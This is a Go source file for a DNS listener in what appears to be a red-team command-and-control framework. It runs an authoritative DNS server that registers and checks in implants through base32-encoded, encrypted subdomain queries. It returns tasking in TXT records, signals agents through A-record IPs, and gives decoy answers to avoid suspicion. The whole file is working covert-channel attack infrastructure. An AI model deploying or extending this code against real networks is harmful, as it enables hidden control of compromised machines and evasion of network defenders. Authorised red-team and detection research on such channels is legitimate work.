package listener

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"github.com/redteamleaders/rtlc2/teamserver/internal/agent"
	"github.com/redteamleaders/rtlc2/teamserver/internal/crypto"
	log "github.com/sirupsen/logrus"
)

// dnsBase32 is the base32 encoding used for DNS label-safe data transport.
// We use the HEX variant (0-9A-V) without padding since DNS labels are
// case-insensitive and padding '=' is not valid in domain names.
var dnsBase32 = base32.HexEncoding.WithPadding(base32.NoPadding)

// Maximum TXT record size per RFC 1035 / practical limits.
const maxTXTChunk = 189 // 63 bytes per string * 3 strings, base32-encoded

// DNS query type prefixes embedded in the subdomain to indicate request type.
const (
	dnsPrefixRegister = "r"
	dnsPrefixCheckin  = "c"
	dnsPrefixData     = "d" // continuation data segment
)

// DNSListener implements a DNS-based C2 listener.
//
// Communication is encoded inside DNS queries and responses:
//   - Agent -> Teamserver: data is base32-encoded in subdomain labels of the
//     configured domain. TXT queries carry the payload; A queries are used as
//     lightweight beacons.
//   - Teamserver -> Agent: responses are base32-encoded inside TXT record
//     values. A record responses use specific IP octets as task indicators.
//
// Example flow:
//
//	Agent sends:  <base32-data>.c.<domain> TXT
//	Server returns TXT record with base32-encoded tasking.
type DNSListener struct {
	config       *Config
	agentManager *agent.Manager
	cipher       *crypto.AESCipher

	// domain is the authoritative domain controlled by the operator (e.g. c2.example.com).
	domain string

	// listenAddr is the local address to bind (e.g. 0.0.0.0).
	listenAddr string

	// port is the UDP (and optionally TCP) port to listen on (typically 53).
	port int

	// dnsServer is the miekg/dns server instance.
	dnsServer *dns.Server

	running bool
	mu      sync.RWMutex

	// pendingData accumulates multi-query payloads keyed by a transaction nonce.
	pendingData     map[string][]byte
	pendingDataTime map[string]time.Time // tracks when each nonce was first seen
}

// NewDNSListener creates a new DNS C2 listener.
func NewDNSListener(cfg *Config, am *agent.Manager, cipher *crypto.AESCipher) *DNSListener {
	domain := cfg.Options["domain"]
	if domain == "" {
		domain = "c2.example.com"
	}
	// Ensure trailing dot for FQDN
	if !strings.HasSuffix(domain, ".") {
		domain = domain + "."
	}

	listenAddr := cfg.BindHost
	if listenAddr == "" {
		listenAddr = "0.0.0.0"
	}

	port := cfg.BindPort
	if port == 0 {
		port = 53
	}

	return &DNSListener{
		config:          cfg,
		agentManager:    am,
		cipher:          cipher,
		domain:          domain,
		listenAddr:      listenAddr,
		port:            port,
		pendingData:     make(map[string][]byte),
		pendingDataTime: make(map[string]time.Time),
	}
}

func (l *DNSListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.running {
		return fmt.Errorf("DNS listener %s is already running", l.config.ID)
	}

	addr := fmt.Sprintf("%s:%d", l.listenAddr, l.port)

	mux := dns.NewServeMux()
	mux.HandleFunc(l.domain, l.handleDNSQuery)

	l.dnsServer = &dns.Server{
		Addr:    addr,
		Net:     "udp",
		Handler: mux,
	}

	// Pre-bind to detect port conflicts immediately
	pc, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to bind UDP %s: %w", addr, err)
	}
	l.dnsServer.PacketConn = pc

	go func() {
		log.Infof("DNS listener starting on %s (domain: %s)", addr, l.domain)
		if err := l.dnsServer.ActivateAndServe(); err != nil {
			log.Errorf("DNS listener error: %v", err)
		}
	}()

	// Also start a TCP DNS server for large responses (UDP truncation fallback)
	tcpServer := &dns.Server{
		Addr:    addr,
		Net:     "tcp",
		Handler: mux,
	}
	go func() {
		log.Infof("DNS TCP listener starting on %s", addr)
		if err := tcpServer.ListenAndServe(); err != nil {
			log.Debugf("DNS TCP listener error: %v", err)
		}
	}()

	// Periodic cleanup of stale pendingData entries (prevents memory leak)
	go func() {
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			l.mu.Lock()
			if !l.running {
				l.mu.Unlock()
				return
			}
			now := time.Now()
			for nonce, ts := range l.pendingDataTime {
				if now.Sub(ts) > 5*time.Minute {
					delete(l.pendingData, nonce)
					delete(l.pendingDataTime, nonce)
					log.Debugf("DNS: expired stale pending data for nonce %s", nonce)
				}
			}
			l.mu.Unlock()
		}
	}()

	l.running = true
	return nil
}

func (l *DNSListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return fmt.Errorf("DNS listener %s is not running", l.config.ID)
	}

	err := l.dnsServer.Shutdown()
	l.running = false

	log.Infof("DNS listener stopped: %s", l.config.ID)
	return err
}

func (l *DNSListener) ID() string       { return l.config.ID }
func (l *DNSListener) Name() string     { return l.config.Name }
func (l *DNSListener) Protocol() int    { return ProtoDNS }
func (l *DNSListener) Address() string {
	return fmt.Sprintf("%s:%d (%s)", l.listenAddr, l.port, l.domain)
}

// handleDNSQuery is the main DNS request handler. It dispatches based on query
// type (A vs TXT) and the subdomain prefix convention.
func (l *DNSListener) handleDNSQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		l.respondRefused(w, r)
		return
	}

	q := r.Question[0]
	qname := strings.ToLower(q.Name)

	// Strip the base domain to get the subdomain data portion.
	// Example: <data>.c.c2.example.com. -> <data>.c
	subdomain := l.extractSubdomain(qname)
	if subdomain == "" {
		// Query is for the bare domain; respond with a plausible SOA or A record.
		l.respondDecoy(w, r, q)
		return
	}

	switch q.Qtype {
	case dns.TypeTXT:
		l.handleTXTQuery(w, r, subdomain)
	case dns.TypeA:
		l.handleAQuery(w, r, subdomain)
	default:
		l.respondDecoy(w, r, q)
	}
}

// handleTXTQuery decodes a base32 subdomain payload and processes it as agent
// traffic (registration or check-in). The response contains base32-encoded
// tasking in TXT records.
func (l *DNSListener) handleTXTQuery(w dns.ResponseWriter, r *dns.Msg, subdomain string) {
	parts := strings.SplitN(subdomain, ".", 2)
	if len(parts) < 2 {
		l.respondEmpty(w, r)
		return
	}

	prefix := parts[0]
	encodedData := strings.ReplaceAll(parts[1], ".", "")
	encodedData = strings.ToUpper(encodedData)

	rawData, err := dnsBase32.DecodeString(encodedData)
	if err != nil {
		log.Debugf("DNS: failed to decode base32 subdomain data: %v", err)
		l.respondEmpty(w, r)
		return
	}

	clientIP := extractDNSClientIP(w)

	var responseBytes []byte

	switch prefix {
	case dnsPrefixRegister:
		responseBytes, err = l.processRegistration(rawData, clientIP)
	case dnsPrefixCheckin:
		responseBytes, err = l.processCheckin(rawData, clientIP)
	case dnsPrefixData:
		// Data continuation segment; acknowledge but no response payload.
		l.handleDataSegment(rawData)
		l.respondEmpty(w, r)
		return
	default:
		log.Debugf("DNS: unknown prefix '%s'", prefix)
		l.respondEmpty(w, r)
		return
	}

	if err != nil {
		log.Warnf("DNS: handler error: %v", err)
		l.respondEmpty(w, r)
		return
	}

	l.respondTXT(w, r, responseBytes)
}

// handleAQuery handles A record beaconing. The agent sends a lightweight A
// query to indicate it is alive. The response IP encodes a simple task
// indicator:
//
//	1.0.0.0 = no pending tasks
//	1.0.0.1 = pending tasks (agent should do a full TXT check-in)
//	1.0.0.2 = terminate
func (l *DNSListener) handleAQuery(w dns.ResponseWriter, r *dns.Msg, subdomain string) {
	parts := strings.SplitN(subdomain, ".", 2)
	if len(parts) < 2 {
		l.respondARecord(w, r, net.IPv4(1, 0, 0, 0))
		return
	}

	encodedData := strings.ReplaceAll(parts[1], ".", "")
	encodedData = strings.ToUpper(encodedData)

	rawData, err := dnsBase32.DecodeString(encodedData)
	if err != nil || len(rawData) < 8 {
		l.respondARecord(w, r, net.IPv4(1, 0, 0, 0))
		return
	}

	agentID := string(rawData[:8])

	// Check if there are pending tasks for this agent
	_, err = l.agentManager.GetSessionCipher(agentID)
	if err != nil {
		// Unknown agent, respond with default
		l.respondARecord(w, r, net.IPv4(1, 0, 0, 0))
		return
	}

	// Update last seen (lightweight beacon)
	clientIP := extractDNSClientIP(w)
	l.agentManager.Checkin(&agent.CheckinRequest{AgentID: agentID}, clientIP)

	// Signal: 1.0.0.1 means "do a full TXT check-in for tasking"
	// For simplicity, always signal pending since the agent will find out
	// during the full check-in whether there are actual tasks.
	l.respondARecord(w, r, net.IPv4(1, 0, 0, 1))
}

// processRegistration decrypts and processes an agent registration relayed
// over DNS.
func (l *DNSListener) processRegistration(encryptedData []byte, clientIP string) ([]byte, error) {
	decrypted, err := l.cipher.Decrypt(encryptedData)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt DNS registration: %w", err)
	}

	var req agent.RegistrationRequest
	if err := json.Unmarshal(decrypted, &req); err != nil {
		return nil, fmt.Errorf("failed to unmarshal DNS registration: %w", err)
	}

	resp, err := l.agentManager.Register(&req, clientIP, l.config.ID)
	if err != nil {
		return nil, fmt.Errorf("DNS agent registration failed: %w", err)
	}

	respData, _ := json.Marshal(resp)
	encrypted, err := l.cipher.Encrypt(respData)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt DNS registration response: %w", err)
	}

	return encrypted, nil
}

// processCheckin decrypts and processes an agent check-in relayed over DNS.
func (l *DNSListener) processCheckin(data []byte, clientIP string) ([]byte, error) {
	if len(data) < 9 {
		return nil, fmt.Errorf("DNS checkin data too short")
	}

	agentID := string(data[:8])
	encryptedPayload := data[8:]

	sessionCipher, err := l.agentManager.GetSessionCipher(agentID)
	if err != nil {
		return nil, fmt.Errorf("unknown agent %s in DNS checkin: %w", agentID, err)
	}

	decrypted, err := sessionCipher.Decrypt(encryptedPayload)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt DNS checkin from %s: %w", agentID, err)
	}

	var req agent.CheckinRequest
	if err := json.Unmarshal(decrypted, &req); err != nil {
		return nil, fmt.Errorf("failed to unmarshal DNS checkin: %w", err)
	}
	req.AgentID = agentID

	resp, err := l.agentManager.Checkin(&req, clientIP)
	if err != nil {
		return nil, fmt.Errorf("DNS agent checkin failed: %w", err)
	}

	respData, _ := json.Marshal(resp)
	encrypted, err := sessionCipher.Encrypt(respData)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt DNS checkin response: %w", err)
	}

	return encrypted, nil
}

// handleDataSegment accumulates a data continuation segment. Large payloads
// that exceed a single DNS query are split across multiple queries, each
// tagged with a nonce for reassembly.
func (l *DNSListener) handleDataSegment(data []byte) {
	// Data format: [8-byte nonce][2-byte seq][payload]
	if len(data) < 10 {
		return
	}

	nonce := string(data[:8])

	l.mu.Lock()
	if _, exists := l.pendingDataTime[nonce]; !exists {
		l.pendingDataTime[nonce] = time.Now()
	}
	l.pendingData[nonce] = append(l.pendingData[nonce], data[10:]...)
	l.mu.Unlock()
}

// extractSubdomain strips the base domain from the queried name and returns
// the remaining subdomain portion.
func (l *DNSListener) extractSubdomain(qname string) string {
	domain := strings.ToLower(l.domain)
	qname = strings.ToLower(qname)

	if !strings.HasSuffix(qname, domain) {
		return ""
	}

	sub := strings.TrimSuffix(qname, domain)
	sub = strings.TrimSuffix(sub, ".")
	return sub
}

// respondTXT sends a DNS TXT response containing base32-encoded data split
// across multiple TXT strings if necessary.
func (l *DNSListener) respondTXT(w dns.ResponseWriter, r *dns.Msg, data []byte) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	encoded := dnsBase32.EncodeToString(data)

	// Split into 253-char chunks (max TXT string length)
	var txtStrings []string
	for len(encoded) > 0 {
		chunkSize := 253
		if chunkSize > len(encoded) {
			chunkSize = len(encoded)
		}
		txtStrings = append(txtStrings, encoded[:chunkSize])
		encoded = encoded[chunkSize:]
	}

	rr := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		Txt: txtStrings,
	}
	msg.Answer = append(msg.Answer, rr)

	if err := w.WriteMsg(msg); err != nil {
		log.Debugf("DNS: failed to write TXT response: %v", err)
	}
}

// respondARecord sends a DNS A record response.
func (l *DNSListener) respondARecord(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	rr := &dns.A{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    0,
		},
		A: ip,
	}
	msg.Answer = append(msg.Answer, rr)

	if err := w.WriteMsg(msg); err != nil {
		log.Debugf("DNS: failed to write A response: %v", err)
	}
}

// respondEmpty sends an empty (NOERROR) response.
func (l *DNSListener) respondEmpty(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	if err := w.WriteMsg(msg); err != nil {
		log.Debugf("DNS: failed to write empty response: %v", err)
	}
}

// respondRefused sends a REFUSED response for malformed queries.
func (l *DNSListener) respondRefused(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Rcode = dns.RcodeRefused

	if err := w.WriteMsg(msg); err != nil {
		log.Debugf("DNS: failed to write REFUSED response: %v", err)
	}
}

// respondDecoy sends a plausible response for unrecognised query types or
// bare domain lookups (e.g. an A record pointing to a benign IP).
func (l *DNSListener) respondDecoy(w dns.ResponseWriter, r *dns.Msg, q dns.Question) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	switch q.Qtype {
	case dns.TypeA:
		rr := &dns.A{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    300,
			},
			A: net.IPv4(93, 184, 216, 34), // example.com IP as decoy
		}
		msg.Answer = append(msg.Answer, rr)
	case dns.TypeAAAA:
		// Return empty for AAAA to avoid suspicion
	default:
		msg.Rcode = dns.RcodeNameError
	}

	if err := w.WriteMsg(msg); err != nil {
		log.Debugf("DNS: failed to write decoy response: %v", err)
	}
}

// extractDNSClientIP extracts the remote IP from a dns.ResponseWriter.
func extractDNSClientIP(w dns.ResponseWriter) string {
	addr := w.RemoteAddr()
	if addr == nil {
		return "unknown"
	}
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return addr.String()
	}
	return host
}
